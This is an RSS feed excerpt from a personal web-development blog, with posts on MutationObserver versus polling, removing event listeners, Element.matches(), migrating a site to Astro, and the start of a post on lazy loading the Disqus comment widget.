&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;So, how responsive is it?&lt;/h2&gt;&lt;p&gt;I mentioned earlier how polling can introduce a small amount of deadweight time when responding to a DOM change. Much of this risk hinges on the size of the interval you’re using, but it doesn’t help that both &lt;code&gt;setTimeout()&lt;/code&gt; and &lt;code&gt;setInterval()&lt;/code&gt; run their callbacks on the primary task queue, which means they’ll always run on a &lt;em&gt;future&lt;/em&gt; iteration of the event loop.&lt;/p&gt;&lt;p&gt;A MutationObserver, however, fires its callback on the &lt;a href=&quot;https://dom.spec.whatwg.org/?ref=cms.macarthur.me#queue-a-mutation-observer-compound-microtask&quot;&gt;microtask queue&lt;/a&gt;, which means it doesn’t need to wait around for a full rotation of the event loop before firing its callback. It’s far more responsive.&lt;/p&gt;&lt;p&gt;I did a rudimentary experiment with this using &lt;code&gt;performance.now()&lt;/code&gt; in the browser to see how long it took for the click event listener to be added to the button after it was mounted to the DOM. Remember, this was with a no delay being set in our &lt;code&gt;setTimeout()&lt;/code&gt;, so the delay we see is likely the pace of the event loop turning itself (plus. Here are the results:&lt;/p&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Approach&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Delay to Add Listener&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;polling&lt;/td&gt;
&lt;td&gt;~8ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MutationObserver()&lt;/td&gt;
&lt;td&gt;~.09ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;That’s a pretty staggering difference. Using polling with a zero-delay &lt;code&gt;setTimeout()&lt;/code&gt; to attach a listener was around around 88 times slower than the MutationObserver. Not bad.&lt;/p&gt;&lt;h2&gt;Stop Polling, Start Observing&lt;/h2&gt;&lt;p&gt;Considering the performance benefits, the simpler API, and the ubiquitous browser support, it’s hard to bet on DOM polling when matched against a MutationObserver. I’m hoping you find it useful when working with eventually-mounted nodes in your own projects. I’ll be looking for other scenarios when it might come in handy myself.&lt;/p&gt;</content:encoded></item><item><title>You’ve Got Options for Removing Event Listeners</title><link>https://macarthur.me/posts/options-for-removing-event-listeners</link><guid isPermaLink="true">https://macarthur.me/posts/options-for-removing-event-listeners</guid><pubDate>Sat, 28 Jan 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Cleaning up your code in runtime is a non-negotiable part of building efficient, predictable applications. One of the ways that’s done in JavaScript is by stewarding event listeners well — specifically, removing them when they’re no longer needed.&lt;/p&gt;&lt;p&gt;There are several approaches available to do this, each with its own set of trade-offs that make it more appropriate in certain circumstances. We’re gonna run through a few of the most often used tactics, as well as a few considerations to keep in mind when you’re trying to decide which is best for the job at any given time.&lt;/p&gt;&lt;p&gt;We’ll be tinkering with the following setup — a button with a single &lt;code&gt;click&lt;/code&gt; event listener attached:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot;&amp;gt;Do Something&amp;lt;/button&amp;gt;

&amp;lt;script&amp;gt;
document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
	console.log(&apos;clicked!&apos;);
});
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;a href=&quot;https://developer.chrome.com/docs/devtools/console/utilities/?ref=cms.macarthur.me#getEventListeners-function&quot;&gt;Chrome’s &lt;/a&gt;&lt;a href=&quot;https://developer.chrome.com/docs/devtools/console/utilities/?ref=cms.macarthur.me#getEventListeners-function&quot;&gt;&lt;code&gt;getEventListeners()&lt;/code&gt;&lt;/a&gt;&lt;a href=&quot;https://developer.chrome.com/docs/devtools/console/utilities/?ref=cms.macarthur.me#getEventListeners-function&quot;&gt; function&lt;/a&gt;, you’d see just one listener attached to that element:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/0cbf857b-cf0d-46dc-9841-a7da5629d310-19.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In the event that you’d need to remove that listener, here’s what you might reach for.&lt;/p&gt;&lt;h2&gt;Using .removeEventListener()&lt;/h2&gt;&lt;p&gt;It’s probably the most obvious, but also the one with the most potential to threaten your sanity. The &lt;code&gt;.removeEventListener()&lt;/code&gt; method accepts three parameters: the type of listener to remove, the callback function for that listener, and an options object.&lt;/p&gt;&lt;p&gt;But herein lies the (potentially) tricky part: those exact parameters must &lt;em&gt;exactly&lt;/em&gt; match what were used when then the listener was set up, including the &lt;em&gt;same reference&lt;/em&gt; in to the callback in memory. Otherwise, &lt;code&gt;.removeEventListener()&lt;/code&gt; does nothing.&lt;/p&gt;&lt;p&gt;With that in mind, this would be totally ineffective:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
	console.log(&apos;clicked!&apos;);
});

document.getElementById(&apos;button&apos;).removeEventListener(&apos;click&apos;, () =&amp;gt; {
	console.log(&apos;clicked!&apos;);
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Even though that callback &lt;em&gt;looks&lt;/em&gt; identical to the one originally attached, it’s not the &lt;em&gt;same reference&lt;/em&gt;. The solution to this is to set the callback to a variable and reference it in both &lt;code&gt;.addEventListener()&lt;/code&gt; and &lt;code&gt;.removeEventListener()&lt;/code&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const myCallback = () =&amp;gt; {
  console.log(&apos;clicked!&apos;);
};

document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, myCallback);
document.getElementById(&apos;button&apos;).removeEventListener(&apos;click&apos;, myCallback);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or, for particular use cases, you could also remove the listener by referencing a pseudo-anonymous function from within the function itself:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;document
  .getElementById(&apos;button&apos;)
  .addEventListener(&apos;click&apos;, function myCallback() {
    console.log(&apos;clicked!&apos;);

    this.removeEventListener(&apos;click&apos;, myCallback);
  });
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Despite its particularity, &lt;code&gt;.removeEventListener()&lt;/code&gt; has the advantages of being very explicit in its purpose. There’s zero doubt as to what it’s doing when you’re reading through the code.&lt;/p&gt;&lt;h2&gt;Using &lt;code&gt;.addEventListener()&lt;/code&gt;’s &lt;code&gt;once&lt;/code&gt; Option&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;.addEventListener()&lt;/code&gt; method comes with a tool to help clean itself up if it’s intended for a one-time use: the &lt;code&gt;once&lt;/code&gt; option. It’s about as simple as it sounds. If it’s set to &lt;code&gt;true&lt;/code&gt;, the listener will automatically remove itself after first being invoked:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const button = document.getElementById(&apos;button&apos;);

button.addEventListener(&apos;click&apos;, () =&amp;gt; {
	console.log(&apos;clicked!&apos;);
}, { once: true });

// &apos;clicked!&apos;
button.click();

// No more listeners!
getEventListeners(button) // {} 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming it fits your use case, this approach might be appropriate if you’re keen on using an anonymous function, given that your listener only needs to be invoked once.&lt;/p&gt;&lt;h2&gt;Cloning &amp;amp; Replacing the Node&lt;/h2&gt;&lt;p&gt;Sometimes, you don’t know about all the listeners active on a given node, but you do know you want to nuke them. In that case, it’s possible to clone the entire node and replace itself with that clone. Using the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;.cloneNode()&lt;/code&gt;&lt;/a&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode?ref=cms.macarthur.me&quot;&gt; method&lt;/a&gt;, none of the listeners attached via &lt;code&gt;.addEventListener()&lt;/code&gt; will be carried over, giving it a clean slate.&lt;/p&gt;&lt;p&gt;Back in the stone age of client-side JavaScript, you would’ve seen this done by querying up to the parent, and replacing a particular child node with a clone:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;button.parentNode.replaceChild(button.cloneNode(true), button);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But in modern browsers, that can be simplified with &lt;code&gt;.replaceWith()&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;button.replaceWith(button.cloneNode(true));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The one thing that could potentially trip you up here is that intrinsic listeners &lt;em&gt;are preserved,&lt;/em&gt; meaning a button with an &lt;code&gt;onclick&lt;/code&gt; attribute would still fire as defined:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot; onclick=&quot;console.log(&apos;clicked!&apos;)&quot;&amp;gt;
	Do Something
&amp;lt;/button&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all, it’s an option worth reaching for if you need to indiscriminately remove listeners of any sort with brute force. On the downside, however, it suffers from being less obvious about its purpose. Some might go so far as to call it a hack.&lt;/p&gt;&lt;h2&gt;Using &lt;code&gt;AbortController()&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;This one’s new to me. I literally just read about it when I came across &lt;a href=&quot;https://twitter.com/calebporzio/status/1617939346786779136?s=20&amp;amp;t=hudHTQt9g3BBoDVpLwoM9A&amp;amp;ref=cms.macarthur.me&quot;&gt;this tweet&lt;/a&gt; from Caleb Porzio. If you’re like me, you might’ve only heard of an &lt;code&gt;AbortController&lt;/code&gt; being used to &lt;a href=&quot;https://javascript.info/fetch-abort?ref=cms.macarthur.me#using-with-fetch&quot;&gt;cancel &lt;/a&gt;&lt;a href=&quot;https://javascript.info/fetch-abort?ref=cms.macarthur.me#using-with-fetch&quot;&gt;&lt;code&gt;fetch()&lt;/code&gt;&lt;/a&gt;&lt;a href=&quot;https://javascript.info/fetch-abort?ref=cms.macarthur.me#using-with-fetch&quot;&gt; requests&lt;/a&gt;. But it’s apparently more flexible than that.&lt;/p&gt;&lt;p&gt;As of recently, &lt;code&gt;.addEventListener()&lt;/code&gt; can be configured with a &lt;code&gt;signal&lt;/code&gt; for imperatively aborting/removing a listener. When the respective controller calls &lt;code&gt;.abort()&lt;/code&gt;, that signal will trigger the listener to be removed:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const button = document.getElementById(&apos;button&apos;);
const controller = new AbortController();
const { signal } = controller;

button.addEventListener(&apos;click&apos;, () =&amp;gt; console.log(&apos;clicked!&apos;), { signal });

// Remove the listener!
controller.abort();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The most apparent advantage to this might be the ergonomics. It’s (in my opinion) a much clearer way of removing a listener without the potential gotcha of dealing with &lt;code&gt;.removeEventListener()&lt;/code&gt;. But there’s a more tactical advantage too: you can use one signal to remove multiple listeners, of any sort, all at once. And using anonymous functions is totally fine too:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const button = document.getElementById(&apos;button&apos;);
const controller = new AbortController();
const { signal } = controller;

button.addEventListener(&apos;click&apos;, () =&amp;gt; console.log(&apos;clicked!&apos;), { signal });
window.addEventListener(&apos;resize&apos;, () =&amp;gt; console.log(&apos;resized!&apos;), { signal });
document.addEventListener(&apos;keyup&apos;, () =&amp;gt; console.log(&apos;pressed!&apos;), { signal });

// Remove all listeners at once:
controller.abort();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The only cause for hesitancy I came across is browser support. It’s a relatively new feature, with full support existing in Chrome &lt;a href=&quot;https://chromium-review.googlesource.com/c/chromium/src/+/2657187?ref=cms.macarthur.me&quot;&gt;only since 2021&lt;/a&gt; (v90). So, keep this in mind if you need to support browser versions beyond only a couple years old.&lt;/p&gt;&lt;h2&gt;Which Should I Choose?&lt;/h2&gt;&lt;p&gt;As with everything else, “it depends.” Still, here’s how I might choose one over the other at a moment’s notice:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;.removeEventListener()&lt;/code&gt; if the callback function is assigned to a variable and within easy reach of where the listener was added.&lt;/li&gt;&lt;li&gt;Use the &lt;code&gt;once&lt;/code&gt; option in &lt;code&gt;.addEventListener()&lt;/code&gt; if you need to fire a callback only once (duh).&lt;/li&gt;&lt;li&gt;Use the clone &amp;amp; replace approach if you need to indiscriminately nuke multiple listeners in one fell swoop.&lt;/li&gt;&lt;li&gt;Use &lt;code&gt;AbortController()&lt;/code&gt; if you have a series of listeners you’d like to imperatively remove at once, or if you just like the syntax.&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;What’s Missing?&lt;/h2&gt;&lt;p&gt;It’s very possible I’m missing another option in addition to these. If you happen to have one, feel free to drop a comment or let me know by some other means. At the very least, I hope this helps to mentally organize some of the the several paths available to clean up event listeners, and to also help prep your brain for the next time you need to manage them in your code.&lt;/p&gt;</content:encoded></item><item><title>Use the .matches() Method to Determine if a Selector Matches an Element</title><link>https://macarthur.me/posts/ways-to-check-if-element-matches-selector</link><guid isPermaLink="true">https://macarthur.me/posts/ways-to-check-if-element-matches-selector</guid><pubDate>Sat, 21 Jan 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I’m rather late to the party, but I recently ran across JavaScript’s &lt;code&gt;Element.matches()&lt;/code&gt;, which allows you to check if a given CSS selector matches an element. Put another way, it tells you if an element &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Element/matches?ref=cms.macarthur.me&quot;&gt;&lt;em&gt;would be&lt;/em&gt;&lt;/a&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Element/matches?ref=cms.macarthur.me&quot;&gt; selected&lt;/a&gt; if the DOM were being queried by something like &lt;code&gt;document.querySelector()&lt;/code&gt;.&lt;/p&gt;&lt;h3&gt;Why I Needed It&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://typeitjs.com/?ref=cms.macarthur.me&quot;&gt;TypeIt&lt;/a&gt; offers a &lt;code&gt;.move()&lt;/code&gt; method that allows someone to move the cursor through a string to a certain selector (&lt;em&gt;any&lt;/em&gt; valid CSS selector in the HTML). As a part of that somewhat complex process, I’m searching an array of nodes for the index that has this selector. Again, because I can’t know what the selector is, I couldn’t reach for something like &lt;code&gt;.classList.contains(&apos;my-selector&apos;)&lt;/code&gt;. At a super zoomed-in level, I’m instead doing a version of this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const nodeIndex = allNodes.findIndex(n =&amp;gt; n.matches(&apos;.selector&apos;));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It’s a little bit of a face-palm moment, because although it’s supported in browsers going back to IE9, I’ve been using less-than-ideal techniques used in the past. This is post was written to honor them before saying goodbye forever.&lt;/p&gt;&lt;h2&gt;Using Element.closest()&lt;/h2&gt;&lt;p&gt;Using &lt;code&gt;.closest()&lt;/code&gt; allows you to query &lt;em&gt;up&lt;/em&gt; through the DOM tree rather than down, and it starts that query with the element on which it’s called. So, if the node itself matches that selector, you’ll get a truthy result. But this approach requires you to verify that the node you’ve found is the same node you’re interested in checking. Otherwise, you’ll still get a truthy result when &lt;code&gt;.closest()&lt;/code&gt; matches against a parent element that happens to have the same selector.&lt;/p&gt;&lt;p&gt;Wrapping up this functionality might look like so:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function hasSelector(element: HTMLElement, selector: string): boolean {
  const matchedNode = node.closest(selector);

  if (!matchedNode) {
    return false;
  }

  return matchedNode === element;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There’s another downside worth noting. Because &lt;code&gt;.closest()&lt;/code&gt; will continue traversing up the tree when it doesn’t find a match, you’re taking on some performance baggage. After all, you’re only actually interested in checking &lt;em&gt;one&lt;/em&gt; element, but &lt;code&gt;.closest()&lt;/code&gt; will keep searching all the way up the tree if it hasn’t found a match.&lt;/p&gt;&lt;h2&gt;Checking the Parent’s Children for Same Node&lt;/h2&gt;&lt;p&gt;You can’t use &lt;code&gt;.querySelector()&lt;/code&gt; on an element to check itself for a selector, but you &lt;em&gt;can&lt;/em&gt; check each of the parent’s children for it. If any of those matched elements are the same node as the target, you’ve got what you need.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function hasSelector(element: HTMLElement, selector: string): boolean {
	if (!element.parentElement) {
		return false;
	}

	return Array.from(element.parentElement.querySelectorAll(selector)).some(
		(node) =&amp;gt; node === element
	);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In terms of performance, this approach is better than the previous because the maximum amount of DOM you’ll crawl is the target element’s direct parent. But readability arguably suffers, and depending on your DOM tree, you still carry some performance overhead because you’re evaluating multiple sibling elements, even though you’re concerned with only one.&lt;/p&gt;&lt;h2&gt;Welcome to the 21st Century&lt;/h2&gt;&lt;p&gt;With the &lt;code&gt;.matches()&lt;/code&gt; method available, neither performance nor verbosity are problems anymore. Only one element — the target element — is ever being handled at a time. On top of that, the API is extremely clear. I’m still kicking myself that this thing has been around for years (and even longer if you consider the &lt;a href=&quot;https://sd.blackball.lv/library/DOM_Enlightenment_(2013).pdf?ref=cms.macarthur.me&quot;&gt;browser-specific implementations&lt;/a&gt; that existed before that). Hope you find it as useful as I have!&lt;/p&gt;</content:encoded></item><item><title>What I Like About Astro</title><link>https://macarthur.me/posts/what-i-like-about-astro</link><guid isPermaLink="true">https://macarthur.me/posts/what-i-like-about-astro</guid><pubDate>Mon, 16 Jan 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This site’s been on Next.js since 2021, and I’ve had very few complaints about it. I’ve appreciated things like its slick developer experience, the first-class support it enjoys from Vercel for features like incremental static regeneration, and the constant innovation driven by its community. It’s a great tool, and my high view of it hasn’t really changed since I first took it on.&lt;/p&gt;&lt;p&gt;But in the meantime, a couple of things started to happen. First off, I began to feel more uncomfortable with the amount of JavaScript I was shipping for a very small amount of interactivity on my site (it’s mainly just content). In terms of standard performance metrics, Next does a great job at generating a fast experience by default. The built output loads assets in the right way, at the right time, and with the right priority. But even so, it still comes with a lot of code that users needs to download, parse, and execute, even though they’re only there to read a blog post. “Irresponsible” is too strong of a word, but the feeling I started to foster was in that same vein.&lt;/p&gt;&lt;p&gt;Second, the tooling landscape changed (as it always does), and Astro came onto the scene. It promised a lot of the ergonomics Next offers, but even more flexibility (you can use any mainstream framework you want while also shipping no JavaScript by default). It touted some big value propositions, but it wasn’t a bandwagon I immediately joined.&lt;/p&gt;&lt;p&gt;But after many months of waiting for the hype to cool down, I decided to try building an integration for &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt;. I was floored by how easy it was. So, I took the next step and moved over my entire site. As I made that migration, I began to mentally organize some of my favorite things about the framework. Here they are. Keep in mind, these items don’t take into account the breadth of what Astro can do. It only considers what I encountered in migrating over my personal blog.&lt;/p&gt;&lt;h2&gt;#1. It supports extremely unopinionated data sourcing.&lt;/h2&gt;&lt;p&gt;I was a victim of the Gatsby.js hype a few years ago. It was one of the first React-based static site generators with some momentum behind it at the time, and it also went all-in on using GraphQL as the protocol that supported its “&lt;a href=&quot;https://www.gatsbyjs.com/blog/2018-10-04-journey-to-the-content-mesh/?ref=cms.macarthur.me&quot;&gt;content mesh&lt;/a&gt;.” These bold opinions and big words wooed me and several others, making us completely blind to the overabundance of complexity the approach brought with it. It didn’t take long for the excitement to wear off and the overbearing friction to become apparent.&lt;/p&gt;&lt;p&gt;Next was better. It didn’t care about how you sourced your data, so long as you did so using hooks like &lt;code&gt;getStaticProps()&lt;/code&gt; within a file that exists inside the &lt;code&gt;pages&lt;/code&gt; directory. (This was before the entrance of React Server Components and Next 13+ that permits you to &lt;a href=&quot;https://nextjs.org/docs/data-fetching/fundamentals?ref=cms.macarthur.me&quot;&gt;collocate your components &amp;amp; data fetching&lt;/a&gt;.) Still, there were some moments when I wished I could break free from those constraints a bit.&lt;/p&gt;&lt;p&gt;Astro takes it multiple steps further, however. There’s no particular function I need to export. In fact, I don’t need to use a separate function at all — top-level &lt;code&gt;await&lt;/code&gt; is &lt;a href=&quot;https://docs.astro.build/en/guides/data-fetching/?ref=cms.macarthur.me#fetch-in-astro&quot;&gt;supported out-of-the box&lt;/a&gt;. All I need to do is set my variables and use them in my template. Done.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
const response = await fetch(&apos;https://an-endpoint.com/api&apos;);
const data = await response.json();
---

&amp;lt;p&amp;gt;{data.a_property}&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Crazily enough, you can even do stuff like this (stolen straight from &lt;a href=&quot;https://docs.astro.build/en/reference/directives-reference/?ref=cms.macarthur.me#sethtml&quot;&gt;their documentation&lt;/a&gt;):&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/cb36379e-46dd-4f8f-97e4-187ed3d5b728-9.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;900&quot; height=&quot;187&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I imagine many don’t find this prescriptive enough. There are probably very good reasons to be wary of the risk this introduces for shooting yourself in the foot. But for a dude just looking to build a simple blog, I highly appreciate this freedom.&lt;/p&gt;&lt;h2&gt;#2. There’s first-class (or readily available) support for integrations to take care of the boring stuff.&lt;/h2&gt;&lt;p&gt;It’s easy enough to spit out some posts and pages. That’s the fun part. But if you’re going to build a site that’s syndication-ready, SEO-friendly, and as fast as possible, you also need worry about things like RSS feeds, sitemaps, and asset optimization. In my opinion, these are pretty boring processes to set up.&lt;/p&gt;&lt;p&gt;These are things that Gatsby, with its rich ecosystem of plugins, does well. If it doesn’t have an official plugin available, there’s likely one supported by the community at large. I recall relying on these plugins for &lt;a href=&quot;https://github.com/gatsbyjs/gatsby/tree/master/packages/gatsby-plugin-sitemap?ref=cms.macarthur.me&quot;&gt;my sitemap&lt;/a&gt;, &lt;a href=&quot;https://github.com/gatsbyjs/gatsby/tree/master/packages/gatsby-plugin-image?ref=cms.macarthur.me&quot;&gt;image optimization&lt;/a&gt;, and &lt;a href=&quot;https://github.com/gatsbyjs/gatsby/tree/master/packages/gatsby-plugin-feed?ref=cms.macarthur.me&quot;&gt;RSS feed&lt;/a&gt; with little issue. And for the things they didn’t directly support, there was often dedicated documentation on standing it up on my own. Like &lt;a href=&quot;https://www.gatsbyjs.com/docs/how-to/adding-common-features/adding-seo-component/?ref=cms.macarthur.me&quot;&gt;how to build an SEO component&lt;/a&gt; for my blog.&lt;/p&gt;&lt;p&gt;Next, however, has some room for improvement. To be fair, I don’t believe Next has ever billed itself as a content-focused framework to the same degree as Gatsby. At any rate, I remember it being more than trivial to get my site going with these must-haves. I ended up rolling my own &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-next/blob/main/scripts/generateSitemap.ts?ref=cms.macarthur.me&quot;&gt;sitemap&lt;/a&gt; and &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-next/blob/main/scripts/generateRssFeed.tsx?ref=cms.macarthur.me&quot;&gt;RSS feed&lt;/a&gt; (with the help of a couple other dependencies), and I believe I built &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-next/blob/main/components/meta.tsx?ref=cms.macarthur.me&quot;&gt;my own component to handle basic SEO configuration&lt;/a&gt; after seeking inspiration from some other blogs.&lt;/p&gt;&lt;p&gt;Doing all of this with Astro was pretty darn straightforward. It has official support for things like &lt;a href=&quot;https://docs.astro.build/en/guides/integrations-guide/sitemap/?ref=cms.macarthur.me&quot;&gt;generating a sitemap&lt;/a&gt;, &lt;a href=&quot;https://docs.astro.build/en/guides/rss/?ref=cms.macarthur.me&quot;&gt;exposing an RSS feed&lt;/a&gt;, and &lt;a href=&quot;https://docs.astro.build/en/guides/images/?ref=cms.macarthur.me#astros-image-integration&quot;&gt;optimizing images.&lt;/a&gt; And for stuff like managing SEO meta data, some &lt;a href=&quot;https://github.com/jonasmerlin/astro-seo?ref=cms.macarthur.me&quot;&gt;pretty good open source packages&lt;/a&gt; exist. In the end, there wasn’t much pain in setting up these non-negotiables.&lt;/p&gt;&lt;h2&gt;#3. It’s really hard to write an unperformant site.&lt;/h2&gt;&lt;p&gt;This is where Astro really shines. By default, there’s no JavaScript shipped to the client for an Astro site. Coming off of multiple React-based frameworks from the past few years, it’s still a little bonkers to me that I get to keep the ergonomics of writing modular components, but without consequence to the user.&lt;/p&gt;&lt;p&gt;In fact, I’ve been so happy with the feel of &lt;a href=&quot;https://docs.astro.build/en/core-concepts/astro-components/?ref=cms.macarthur.me&quot;&gt;Astro’s proprietary component syntax&lt;/a&gt;, that I’ve been using them exclusively. The learning curve was minimal, especially since it’s so heavily inspired by React’s API. As I built out the pieces of my site, I came to truly realize how much I didn’t enjoy writing &lt;em&gt;React&lt;/em&gt; so much as I liked the &lt;em&gt;mental modal&lt;/em&gt; that React’s adopted. With any given Astro component, I get all the benefits of writing basic presentational components — a bit of logic, a templating system that I like, and even props. But unlike React, &lt;em&gt;none&lt;/em&gt; of that code results in any more JavaScript being shipped to my users. And that makes it &lt;em&gt;really hard&lt;/em&gt; to build a slow, bloated site.&lt;/p&gt;&lt;p&gt;But there’s more available in Astro to aid in strong site performance too. It’s been really pioneering its &lt;a href=&quot;https://docs.astro.build/en/concepts/islands/?ref=cms.macarthur.me&quot;&gt;“islands” architecture&lt;/a&gt;, which allows you to easily opt into client-side interactivity on a per-component basis. But even if you don’t go that route, you’re free to use a good, ol’ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag in any of your components. &lt;a href=&quot;https://docs.astro.build/en/guides/client-side-scripts/?ref=cms.macarthur.me#using-script-in-astro&quot;&gt;Each of them will be automatically hoisted&lt;/a&gt;, deduplicated, and optimized on build. So, where interactivity is needed, it’s easy enough to sprinkle it in without a huge impact to your bundle. You get the banana without the gorilla.&lt;/p&gt;&lt;h2&gt;#4. Much of the API is built on web standards.&lt;/h2&gt;&lt;p&gt;This is a smaller one, but still something I really admire. Much of Astro’s lower-level API is based on web standards, which makes the learning curve a little smoother. For example, the &lt;code&gt;Astro.request&lt;/code&gt; object is just an &lt;a href=&quot;https://docs.astro.build/en/reference/api-reference/?ref=cms.macarthur.me#astrorequest&quot;&gt;instance of Request&lt;/a&gt;. You can freely use &lt;code&gt;fetch()&lt;/code&gt; for &lt;a href=&quot;https://docs.astro.build/en/guides/data-fetching/?ref=cms.macarthur.me#fetch-in-astro&quot;&gt;retrieving any data&lt;/a&gt;. Its &lt;a href=&quot;https://docs.astro.build/en/guides/server-side-rendering/?ref=cms.macarthur.me#response&quot;&gt;server-side rendering mode&lt;/a&gt; depends heavily on basic Response objects.&lt;/p&gt;&lt;p&gt;For my migration, I didn’t use these a whole lot. Even so, in a world where frameworks run rampant and so many tools are introducing new DSLs and syntax, it’s refreshing to have something so fundamental to the web remain consistent.&lt;/p&gt;&lt;h2&gt;Honeymoon’s Not Over Yet&lt;/h2&gt;&lt;p&gt;This post will likely need an update at some point, because I’m admittedly still in the honeymoon phase. So far, there really hasn’t been much of what I’d like to see changed or introduced (aside from &lt;a href=&quot;https://docs.astro.build/en/guides/markdown-content/?ref=cms.macarthur.me#fetching-remote-markdown&quot;&gt;built-in support for parsing remote Markdown&lt;/a&gt;). But that’ll undoubtedly shift as my site does. That said, I don’t recall feeling quite the same way about first adopting Gatsby or Next. For both of those tools, despite enjoying the experience and being generally pleased with the result, I always felt a tinge of guilt at the end of the day, mainly because I knew there was so much code being sent on every page load that my site didn’t really need.&lt;/p&gt;&lt;p&gt;So, yes, I could be caught up in a haze of hype as I continue to dive into Astro. Or, maybe it’s actually a tool that has finally struck a good balance between developer experience and build quality. Time will tell.&lt;/p&gt;</content:encoded></item><item><title>How to Lazy Load Disqus for Improved Site Performance</title><link>https://macarthur.me/posts/lazy-load-disqus</link><guid isPermaLink="true">https://macarthur.me/posts/lazy-load-disqus</guid><pubDate>Sat, 14 Jan 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I’ve been a vocal opponent of using Disqus for a number of reasons, one of which being what it does to the performance of your website. It’s actually one of the reasons I built &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;an alternative&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Despite that, &lt;a href=&quot;https://trends.builtwith.com/widgets/Disqus?ref=cms.macarthur.me&quot;&gt;it’s a widely used service&lt;/a&gt; that won’t be going away anytime soon. And if people are going to continue to rely on it, there’s at least one thing they should do to help soften that performance hit: lazy load it. Let it wreak havoc on the user only when the user is &lt;em&gt;actually going to see it&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;This single change can have a hefty impact on metrics like overall page load time, the amount of time the main thread of the browser is blocked, and how much code you require your readers (specifically those that don’t even reach your comments) to download, parse, and execute. And it’s rather simple to implement.&lt;/p&gt;&lt;h2&gt;How a Typical Implementation Falls Short&lt;/h2&gt;&lt;p&gt;By default, setting up Disqus requires including a bit of HTML and some inline JavaScript. It’s not much:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&quot;disqus_thread&quot;&amp;gt;&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
    var disqus_config = function () {
	    this.page.url = PAGE_URL;
		  this.page.identifier = PAGE_IDENTIFIER;
    };

    (function() {
    var d = document, s = d.createElement(&apos;script&apos;);
    s.src = &apos;https://EXAMPLE.disqus.com/embed.js&apos;;
    s.setAttribute(&apos;data-timestamp&apos;, +new Date());
    (d.head || d.body).appendChild(s);
    })();
&amp;lt;/script&amp;gt;
